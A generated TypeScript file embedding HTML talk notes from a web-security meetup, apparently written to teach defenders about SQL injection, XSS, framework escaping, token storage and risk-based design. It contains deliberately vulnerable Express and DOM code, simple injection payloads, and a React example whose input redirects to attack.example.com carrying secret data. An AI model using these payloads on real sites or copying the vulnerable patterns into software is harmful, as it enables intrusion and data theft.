// Generated by scripts/generate-articles.ts. Do not edit.
export default {"html":"<p data-line=\"0\" class=\"code-line\">Talk notes from the following event.</p>\n<p data-line=\"2\" class=\"code-line\"><a href=\"https://nishinomiya.connpass.com/event/356978/\" rel=\"noopener noreferrer\" target=\"_blank\">https://nishinomiya.connpass.com/event/356978/</a><a href=\"https://nishinomiya.connpass.com/event/356978/\" style=\"display:none\" target=\"_blank\" rel=\"noopener noreferrer\">https://nishinomiya.connpass.com/event/356978/</a></p>\n<hr data-line=\"4\" class=\"code-line\">\n<h2 id=\"where-to-start-learning-security\" data-line=\"6\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#where-to-start-learning-security\" aria-hidden=\"true\"></a> Where to start learning security</h2>\n<h2 id=\"obvious-vulnerabilities\" data-line=\"8\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#obvious-vulnerabilities\" aria-hidden=\"true\"></a> Obvious vulnerabilities</h2>\n<ul data-line=\"10\" class=\"code-line\">\n<li data-line=\"10\" class=\"code-line\">\n<p data-line=\"10\" class=\"code-line\">When you start learning security, \"obvious vulnerabilities\" come first</p>\n</li>\n<li data-line=\"11\" class=\"code-line\">\n<p data-line=\"11\" class=\"code-line\">Many books cover them</p>\n</li>\n<li data-line=\"13\" class=\"code-line\">\n<p data-line=\"13\" class=\"code-line\">SQL injection</p>\n</li>\n</ul>\n<p data-line=\"15\" class=\"code-line\">Sending <code>/user?name=' OR '1'='1</code> can return every user:</p>\n<div class=\"code-block-container\"><pre class=\"shiki github-dark\" style=\"background-color:#151e2c;color:#e1e4e8\"><code class=\"code-line\" data-line=\"17\"><span class=\"line\"><span style=\"color:#E1E4E8\">app.</span><span style=\"color:#B392F0\">get</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#9ECBFF\">\"/user\"</span><span style=\"color:#E1E4E8\">, (</span><span style=\"color:#FFAB70\">req</span><span style=\"color:#E1E4E8\">, </span><span style=\"color:#FFAB70\">res</span><span style=\"color:#E1E4E8\">) </span><span style=\"color:#F97583\">=&gt;</span><span style=\"color:#E1E4E8\"> {</span></span>\n<span class=\"line\"><span style=\"color:#F97583\">  const</span><span style=\"color:#79B8FF\"> name</span><span style=\"color:#F97583\"> =</span><span style=\"color:#E1E4E8\"> req.query.name;</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">  db.</span><span style=\"color:#B392F0\">get</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#9ECBFF\">`SELECT * FROM users WHERE name = '${</span><span style=\"color:#E1E4E8\">name</span><span style=\"color:#9ECBFF\">}'`</span><span style=\"color:#E1E4E8\">, (</span><span style=\"color:#FFAB70\">err</span><span style=\"color:#E1E4E8\">, </span><span style=\"color:#FFAB70\">row</span><span style=\"color:#E1E4E8\">) </span><span style=\"color:#F97583\">=&gt;</span><span style=\"color:#E1E4E8\"> {</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">    res.</span><span style=\"color:#B392F0\">send</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#9ECBFF\">`Hello ${</span><span style=\"color:#E1E4E8\">row</span><span style=\"color:#9ECBFF\">.</span><span style=\"color:#E1E4E8\">name</span><span style=\"color:#9ECBFF\">}`</span><span style=\"color:#E1E4E8\">);</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">  });</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">});</span></span>\n<span class=\"line\"></span></code></pre></div><ul data-line=\"26\" class=\"code-line\">\n<li data-line=\"26\" class=\"code-line\">XSS</li>\n</ul>\n<p data-line=\"28\" class=\"code-line\">Adding <code>?name=&lt;script&gt;alert('XSS')</code> to the URL may execute JavaScript as-is:</p>\n<div class=\"code-block-container\"><pre class=\"shiki github-dark\" style=\"background-color:#151e2c;color:#e1e4e8\"><code class=\"code-line\" data-line=\"30\"><span class=\"line\"><span style=\"color:#E1E4E8\">&lt;</span><span style=\"color:#85E89D\">div</span><span style=\"color:#B392F0\"> id</span><span style=\"color:#E1E4E8\">=</span><span style=\"color:#9ECBFF\">\"welcome\"</span><span style=\"color:#E1E4E8\">&gt;&lt;/</span><span style=\"color:#85E89D\">div</span><span style=\"color:#E1E4E8\">&gt;</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">&lt;</span><span style=\"color:#85E89D\">script</span><span style=\"color:#E1E4E8\">&gt;</span></span>\n<span class=\"line\"><span style=\"color:#F97583\">  const</span><span style=\"color:#79B8FF\"> params</span><span style=\"color:#F97583\"> =</span><span style=\"color:#F97583\"> new</span><span style=\"color:#B392F0\"> URLSearchParams</span><span style=\"color:#E1E4E8\">(location.search);</span></span>\n<span class=\"line\"><span style=\"color:#F97583\">  const</span><span style=\"color:#79B8FF\"> name</span><span style=\"color:#F97583\"> =</span><span style=\"color:#E1E4E8\"> params.</span><span style=\"color:#B392F0\">get</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#9ECBFF\">\"name\"</span><span style=\"color:#E1E4E8\">);</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">  document.</span><span style=\"color:#B392F0\">getElementById</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#9ECBFF\">\"welcome\"</span><span style=\"color:#E1E4E8\">).innerHTML </span><span style=\"color:#F97583\">=</span><span style=\"color:#9ECBFF\"> `Welcome, ${</span><span style=\"color:#E1E4E8\">name</span><span style=\"color:#9ECBFF\">}`</span><span style=\"color:#E1E4E8\">;</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">&lt;/</span><span style=\"color:#85E89D\">script</span><span style=\"color:#E1E4E8\">&gt;</span></span>\n<span class=\"line\"></span></code></pre></div><ul data-line=\"39\" class=\"code-line\">\n<li data-line=\"39\" class=\"code-line\">Testing often follows the Web Security Testing Guide (WSTG)\n<ul data-line=\"40\" class=\"code-line\">\n<li data-line=\"40\" class=\"code-line\">Covers modern web tech and attack techniques</li>\n<li data-line=\"41\" class=\"code-line\">Test cases are organized systematically</li>\n<li data-line=\"42\" class=\"code-line\">Maps to OWASP Top 10</li>\n<li data-line=\"43\" class=\"code-line\">Recommends combining manual tests and automated tools</li>\n</ul>\n</li>\n</ul>\n<table data-line=\"45\" class=\"code-line\">\n<thead data-line=\"45\" class=\"code-line\">\n<tr data-line=\"45\" class=\"code-line\">\n<th>Category code</th>\n<th>Category name</th>\n<th>Summary</th>\n</tr>\n</thead>\n<tbody data-line=\"47\" class=\"code-line\">\n<tr data-line=\"47\" class=\"code-line\">\n<td>WSTG-INFO</td>\n<td>Information gathering</td>\n<td>Investigate structure, technology, entry points</td>\n</tr>\n<tr data-line=\"48\" class=\"code-line\">\n<td>WSTG-CONF</td>\n<td>Configuration and deployment</td>\n<td>Check insecure configs, defaults, environment leaks</td>\n</tr>\n<tr data-line=\"49\" class=\"code-line\">\n<td>WSTG-IDENT</td>\n<td>Identity management</td>\n<td>Registration, login, password handling</td>\n</tr>\n<tr data-line=\"50\" class=\"code-line\">\n<td>WSTG-AUTHN</td>\n<td>Authentication</td>\n<td>Bypass, strength, session persistence</td>\n</tr>\n<tr data-line=\"51\" class=\"code-line\">\n<td>WSTG-AUTHZ</td>\n<td>Authorization</td>\n<td>Access control and privilege escalation</td>\n</tr>\n<tr data-line=\"52\" class=\"code-line\">\n<td>WSTG-SESS</td>\n<td>Session management</td>\n<td>Token generation, management, expiry</td>\n</tr>\n<tr data-line=\"53\" class=\"code-line\">\n<td>WSTG-INPV</td>\n<td>Input validation</td>\n<td>Sanitization, validation, injection defenses</td>\n</tr>\n<tr data-line=\"54\" class=\"code-line\">\n<td>WSTG-CRYP</td>\n<td>Cryptography</td>\n<td>Encryption in transit and at rest</td>\n</tr>\n<tr data-line=\"55\" class=\"code-line\">\n<td>WSTG-BUSL</td>\n<td>Business logic</td>\n<td>Abuse along business flows (e.g., fraudulent discounts)</td>\n</tr>\n<tr data-line=\"56\" class=\"code-line\">\n<td>WSTG-CLNT</td>\n<td>Client-side</td>\n<td>JavaScript, DOM manipulation</td>\n</tr>\n<tr data-line=\"57\" class=\"code-line\">\n<td>WSTG-API</td>\n<td>API security</td>\n<td>Auth and input validation for REST, GraphQL, etc.</td>\n</tr>\n<tr data-line=\"58\" class=\"code-line\">\n<td>WSTG-MISC</td>\n<td>Other</td>\n<td>Logging, monitoring, error handling</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"what-you-have-to-think-about-in-practice\" data-line=\"60\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#what-you-have-to-think-about-in-practice\" aria-hidden=\"true\"></a> What you have to think about in practice</h2>\n<h2 id=\"automate-defenses\" data-line=\"62\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#automate-defenses\" aria-hidden=\"true\"></a> Automate defenses</h2>\n<h3 id=\"xss%3A-use-a-javascript-framework\" data-line=\"64\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#xss%3A-use-a-javascript-framework\" aria-hidden=\"true\"></a> XSS: use a JavaScript framework</h3>\n<h3 id=\"angular\" data-line=\"66\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#angular\" aria-hidden=\"true\"></a> Angular</h3>\n<ul data-line=\"68\" class=\"code-line\">\n<li data-line=\"68\" class=\"code-line\">Automatic escaping</li>\n<li data-line=\"69\" class=\"code-line\">Data binding is filtered by Angular even with <code>innerHTML</code></li>\n<li data-line=\"70\" class=\"code-line\">To inject scripts you must explicitly opt in with <code>DomSanitizer</code></li>\n</ul>\n<div class=\"code-block-container\"><pre class=\"shiki github-dark\" style=\"background-color:#151e2c;color:#e1e4e8\"><code class=\"code-line\" data-line=\"72\"><span class=\"line\"><span style=\"color:#E1E4E8\">@</span><span style=\"color:#B392F0\">Component</span><span style=\"color:#E1E4E8\">({</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">  template: </span><span style=\"color:#9ECBFF\">`</span></span>\n<span class=\"line\"><span style=\"color:#9ECBFF\">        &lt;p&gt;{{ htmlSnippet }}&lt;/p&gt;</span></span>\n<span class=\"line\"><span style=\"color:#9ECBFF\">        &lt;p [innerHTML]=\"htmlSnippet\"&gt;&lt;/p&gt;</span></span>\n<span class=\"line\"><span style=\"color:#9ECBFF\">  `</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">})</span></span>\n<span class=\"line\"><span style=\"color:#F97583\">class</span><span style=\"color:#B392F0\"> SomeComponent</span><span style=\"color:#E1E4E8\"> {</span></span>\n<span class=\"line\"><span style=\"color:#F97583\">  constructor</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#F97583\">private</span><span style=\"color:#FFAB70\"> sanitizer</span><span style=\"color:#F97583\">:</span><span style=\"color:#B392F0\"> DomSanitizer</span><span style=\"color:#E1E4E8\">) {}</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color:#FFAB70\">  htmlSnippet</span><span style=\"color:#F97583\"> =</span><span style=\"color:#79B8FF\"> this</span><span style=\"color:#E1E4E8\">.sanitizer.</span><span style=\"color:#B392F0\">bypassSecurityTrustHtml</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#9ECBFF\">`Template &lt;script&gt;alert(\"XSS\")&lt;/script&gt; &lt;b&gt;Syntax&lt;/b&gt;`</span><span style=\"color:#E1E4E8\">);</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">}</span></span>\n<span class=\"line\"></span></code></pre></div><p data-line=\"86\" class=\"code-line\">Reference: <a href=\"https://blog.lacolaco.net/posts/trusted-types-and-angular-security/\" target=\"_blank\" rel=\"noopener noreferrer\">https://blog.lacolaco.net/posts/trusted-types-and-angular-security/</a></p>\n<h4 id=\"react\" data-line=\"88\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#react\" aria-hidden=\"true\"></a> React</h4>\n<ul data-line=\"90\" class=\"code-line\">\n<li data-line=\"90\" class=\"code-line\">Escapes by default</li>\n<li data-line=\"91\" class=\"code-line\">Disabled with <code>dangerouslySetInnerHTML</code></li>\n<li data-line=\"92\" class=\"code-line\">Abuse of <code>javascript:</code> URLs</li>\n</ul>\n<div class=\"code-block-container\"><pre class=\"shiki github-dark\" style=\"background-color:#151e2c;color:#e1e4e8\"><code class=\"code-line\" data-line=\"94\"><span class=\"line\"><span style=\"color:#F97583\">const</span><span style=\"color:#B392F0\"> App</span><span style=\"color:#F97583\"> =</span><span style=\"color:#E1E4E8\"> () </span><span style=\"color:#F97583\">=&gt;</span><span style=\"color:#E1E4E8\"> {</span></span>\n<span class=\"line\"><span style=\"color:#a0aab5\">  // Malicious value</span></span>\n<span class=\"line\"><span style=\"color:#F97583\">  const</span><span style=\"color:#79B8FF\"> userInput</span><span style=\"color:#F97583\"> =</span><span style=\"color:#9ECBFF\"> \"');location.href = 'http://attack.example.com?data=secret_data';//\"</span><span style=\"color:#E1E4E8\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color:#F97583\">  const</span><span style=\"color:#79B8FF\"> hrefAction</span><span style=\"color:#F97583\"> =</span><span style=\"color:#9ECBFF\"> `</span></span>\n<span class=\"line\"><span style=\"color:#9ECBFF\">    alert('${</span><span style=\"color:#E1E4E8\">userInput</span><span style=\"color:#9ECBFF\">}');</span></span>\n<span class=\"line\"><span style=\"color:#9ECBFF\">  `</span><span style=\"color:#E1E4E8\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color:#F97583\">  return</span><span style=\"color:#E1E4E8\"> (</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">    &lt;</span><span style=\"color:#85E89D\">div</span><span style=\"color:#E1E4E8\">&gt;</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">      &lt;</span><span style=\"color:#85E89D\">a</span><span style=\"color:#B392F0\"> href</span><span style=\"color:#F97583\">=</span><span style=\"color:#E1E4E8\">{</span><span style=\"color:#9ECBFF\">`javascript:${</span><span style=\"color:#E1E4E8\">hrefAction</span><span style=\"color:#9ECBFF\">}`</span><span style=\"color:#E1E4E8\">}&gt;link&lt;/</span><span style=\"color:#85E89D\">a</span><span style=\"color:#E1E4E8\">&gt;</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">    &lt;/</span><span style=\"color:#85E89D\">div</span><span style=\"color:#E1E4E8\">&gt;</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">  );</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">};</span></span>\n<span class=\"line\"></span></code></pre></div><ul data-line=\"111\" class=\"code-line\">\n<li data-line=\"111\" class=\"code-line\">Reference: <a href=\"https://qiita.com/kazzzzzz/items/897f8ed89ca36a0734de\" target=\"_blank\" rel=\"noopener noreferrer\">https://qiita.com/kazzzzzz/items/897f8ed89ca36a0734de</a></li>\n</ul>\n<h3 id=\"sql-injection\" data-line=\"113\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#sql-injection\" aria-hidden=\"true\"></a> SQL injection</h3>\n<ul data-line=\"114\" class=\"code-line\">\n<li data-line=\"114\" class=\"code-line\">Use TypeORM or another framework</li>\n<li data-line=\"115\" class=\"code-line\">Automatic escaping applies</li>\n<li data-line=\"116\" class=\"code-line\">Even raw SQL in TypeORM is safe if you pass parameters correctly</li>\n</ul>\n<div class=\"code-block-container\"><pre class=\"shiki github-dark\" style=\"background-color:#151e2c;color:#e1e4e8\"><code class=\"code-line\" data-line=\"118\"><span class=\"line\"><span style=\"color:#E1E4E8\">app.</span><span style=\"color:#B392F0\">get</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#9ECBFF\">\"/user\"</span><span style=\"color:#E1E4E8\">, (</span><span style=\"color:#FFAB70\">req</span><span style=\"color:#E1E4E8\">, </span><span style=\"color:#FFAB70\">res</span><span style=\"color:#E1E4E8\">) </span><span style=\"color:#F97583\">=&gt;</span><span style=\"color:#E1E4E8\"> {</span></span>\n<span class=\"line\"><span style=\"color:#F97583\">  const</span><span style=\"color:#79B8FF\"> name</span><span style=\"color:#F97583\"> =</span><span style=\"color:#E1E4E8\"> req.query.name;</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">  db.</span><span style=\"color:#B392F0\">get</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#9ECBFF\">`SELECT * FROM users WHERE name = ?`</span><span style=\"color:#E1E4E8\">, name, (</span><span style=\"color:#FFAB70\">err</span><span style=\"color:#E1E4E8\">, </span><span style=\"color:#FFAB70\">row</span><span style=\"color:#E1E4E8\">) </span><span style=\"color:#F97583\">=&gt;</span><span style=\"color:#E1E4E8\"> {</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">    res.</span><span style=\"color:#B392F0\">send</span><span style=\"color:#E1E4E8\">(</span><span style=\"color:#9ECBFF\">`Hello ${</span><span style=\"color:#E1E4E8\">row</span><span style=\"color:#9ECBFF\">.</span><span style=\"color:#E1E4E8\">name</span><span style=\"color:#9ECBFF\">}`</span><span style=\"color:#E1E4E8\">);</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">  });</span></span>\n<span class=\"line\"><span style=\"color:#E1E4E8\">});</span></span>\n<span class=\"line\"></span></code></pre></div><h2 id=\"think-about-what-can-happen\" data-line=\"127\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#think-about-what-can-happen\" aria-hidden=\"true\"></a> Think about what can happen</h2>\n<h3 id=\"authentication%2C-for-example\" data-line=\"129\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#authentication%2C-for-example\" aria-hidden=\"true\"></a> Authentication, for example</h3>\n<ul data-line=\"130\" class=\"code-line\">\n<li data-line=\"130\" class=\"code-line\">Auth0 treats storing access tokens in LocalStorage as risky (CSRF—stolen tokens can drive the account via curl) and uses in-memory tokens plus iframes for persistence</li>\n<li data-line=\"131\" class=\"code-line\">Firebase Authentication stores tokens in IndexedDB, so you can view or steal them from DevTools</li>\n<li data-line=\"132\" class=\"code-line\">Calling Firebase Authentication \"weaker\" on that basis alone is nonsense</li>\n<li data-line=\"133\" class=\"code-line\">I think risk assessment should be \"who can do what\"</li>\n<li data-line=\"134\" class=\"code-line\">Firebase Authentication lets users delete their own account without going through app offboarding</li>\n<li data-line=\"135\" class=\"code-line\">In a normal environment, others cannot obtain someone else's token, so they cannot operate another account</li>\n<li data-line=\"136\" class=\"code-line\">What if a malicious user sits next to you and uses your PC while you are away?</li>\n<li data-line=\"137\" class=\"code-line\">If you hear the full chain—\"open a colleague's PC, hit the URL, steal the Firebase Authentication token, curl app endpoints from your machine bypassing validation to operate their account\"—everyone probably thinks:</li>\n<li data-line=\"138\" class=\"code-line\">\"Why bother stealing the token—just use the PC directly.\"\n<ul data-line=\"139\" class=\"code-line\">\n<li data-line=\"139\" class=\"code-line\">Wait too long and the token expires anyway.</li>\n</ul>\n</li>\n<li data-line=\"140\" class=\"code-line\">Firebase Authentication still stores tokens in IndexedDB and has users worldwide</li>\n</ul>\n<h3 id=\"xss\" data-line=\"142\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#xss\" aria-hidden=\"true\"></a> XSS</h3>\n<ul data-line=\"144\" class=\"code-line\">\n<li data-line=\"144\" class=\"code-line\">\n<p data-line=\"144\" class=\"code-line\">Posting <code>&lt;script&gt;alert('hello')&lt;/script&gt;</code> on a bulletin board may execute JS</p>\n</li>\n<li data-line=\"145\" class=\"code-line\">\n<p data-line=\"145\" class=\"code-line\">With optimistic UI and backend sanitization:</p>\n<ul data-line=\"146\" class=\"code-line\">\n<li data-line=\"146\" class=\"code-line\">You might only amuse yourself with alerts or redirects on your own screen</li>\n</ul>\n</li>\n<li data-line=\"147\" class=\"code-line\">\n<p data-line=\"147\" class=\"code-line\">Storing unsanitized script strings in the DB and executing them for every viewer who reads them is clearly a vulnerability</p>\n</li>\n<li data-line=\"149\" class=\"code-line\">\n<p data-line=\"149\" class=\"code-line\">Impact levels</p>\n<ul data-line=\"150\" class=\"code-line\">\n<li data-line=\"150\" class=\"code-line\">Anonymous bulletin boards: users rarely enter PII or card data even if someone is malicious\n<ul data-line=\"151\" class=\"code-line\">\n<li data-line=\"151\" class=\"code-line\">Show something with <code>alert</code></li>\n<li data-line=\"152\" class=\"code-line\">Redirect to a malicious site</li>\n<li data-line=\"153\" class=\"code-line\">Break other features</li>\n</ul>\n</li>\n<li data-line=\"154\" class=\"code-line\">As services grow more capable:\n<ul data-line=\"155\" class=\"code-line\">\n<li data-line=\"155\" class=\"code-line\">Send form <code>change</code> events to a third party</li>\n<li data-line=\"156\" class=\"code-line\">Listen for <code>submit</code> and exfiltrate input</li>\n</ul>\n</li>\n<li data-line=\"157\" class=\"code-line\">\"What can others do?\" marks the vulnerability boundary; attackers also maximize benefit by affecting \"how many people\" for \"how long\" unnoticed</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"from-%22nothing-happens%22-to-%22something-might-happen%22\" data-line=\"159\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#from-%22nothing-happens%22-to-%22something-might-happen%22\" aria-hidden=\"true\"></a> From \"nothing happens\" to \"something might happen\"</h2>\n<ul data-line=\"161\" class=\"code-line\">\n<li data-line=\"161\" class=\"code-line\">\n<p data-line=\"161\" class=\"code-line\"><a href=\"https://www.publickey1.jp/blog/15/chaos_kongnetflix.html\" target=\"_blank\" rel=\"noopener noreferrer\">\"Chaos Kong: Netflix's test that takes down entire cloud regions\"</a> (2015)</p>\n</li>\n<li data-line=\"162\" class=\"code-line\">\n<p data-line=\"162\" class=\"code-line\">Chaos Kong randomly kills servers (even in production, unpredictably) to test failover</p>\n</li>\n<li data-line=\"163\" class=\"code-line\">\n<p data-line=\"163\" class=\"code-line\">(The idea is) terrifying</p>\n</li>\n<li data-line=\"165\" class=\"code-line\">\n<p data-line=\"165\" class=\"code-line\">Design so vulnerabilities are not fatal</p>\n</li>\n<li data-line=\"166\" class=\"code-line\">\n<p data-line=\"166\" class=\"code-line\">Do not hold information valuable to attackers</p>\n<ul data-line=\"167\" class=\"code-line\">\n<li data-line=\"167\" class=\"code-line\">Non-transparent payments mean XSS cannot steal card numbers</li>\n<li data-line=\"168\" class=\"code-line\">Without PII or card data, successful XSS yields little</li>\n</ul>\n</li>\n<li data-line=\"169\" class=\"code-line\">\n<p data-line=\"169\" class=\"code-line\">Split what you must keep for operations</p>\n<ul data-line=\"170\" class=\"code-line\">\n<li data-line=\"170\" class=\"code-line\">Login: Firebase Authentication</li>\n<li data-line=\"171\" class=\"code-line\">Payments: Stripe</li>\n<li data-line=\"172\" class=\"code-line\">Ephemeral data: ElastiCache / Elastic Cloud</li>\n<li data-line=\"173\" class=\"code-line\">Sometimes user Web Storage is enough</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"summary\" data-line=\"175\" class=\"code-line\"><a class=\"header-anchor-link\" href=\"#summary\" aria-hidden=\"true\"></a> Summary</h2>\n<ul data-line=\"176\" class=\"code-line\">\n<li data-line=\"176\" class=\"code-line\">The mistake in security risk assessment is assuming \"malicious users cannot exist\"\n<ul data-line=\"177\" class=\"code-line\">\n<li data-line=\"177\" class=\"code-line\">Security work exists because of them; without them I would happily talk to MySQL from the frontend—I hold a personal grudge about the extra effort</li>\n</ul>\n</li>\n<li data-line=\"178\" class=\"code-line\">\"What a malicious actor could do\" should be separate from the common view that \"nobody would do that\"</li>\n<li data-line=\"179\" class=\"code-line\">Security talks often emphasize \"do not build vulnerable entry points\"</li>\n<li data-line=\"180\" class=\"code-line\">What matters is risk management starting from \"what is possible\"</li>\n<li data-line=\"181\" class=\"code-line\">When thinking about security, get in the habit of asking not \"what might happen to me\" but \"if I—someone who knows this app extremely well—were malicious, what could I cause?\"\n<ul data-line=\"182\" class=\"code-line\">\n<li data-line=\"182\" class=\"code-line\">That attacker mindset helps security assessment</li>\n</ul>\n</li>\n</ul>\n","headings":[{"id":"where-to-start-learning-security","text":"Where to start learning security","level":2},{"id":"obvious-vulnerabilities","text":"Obvious vulnerabilities","level":2},{"id":"what-you-have-to-think-about-in-practice","text":"What you have to think about in practice","level":2},{"id":"automate-defenses","text":"Automate defenses","level":2},{"id":"xss%3A-use-a-javascript-framework","text":"XSS: use a JavaScript framework","level":3},{"id":"angular","text":"Angular","level":3},{"id":"sql-injection","text":"SQL injection","level":3},{"id":"think-about-what-can-happen","text":"Think about what can happen","level":2},{"id":"authentication%2C-for-example","text":"Authentication, for example","level":3},{"id":"xss","text":"XSS","level":3},{"id":"from-%22nothing-happens%22-to-%22something-might-happen%22","text":"From \"nothing happens\" to \"something might happen\"","level":2},{"id":"summary","text":"Summary","level":2}]} as const;
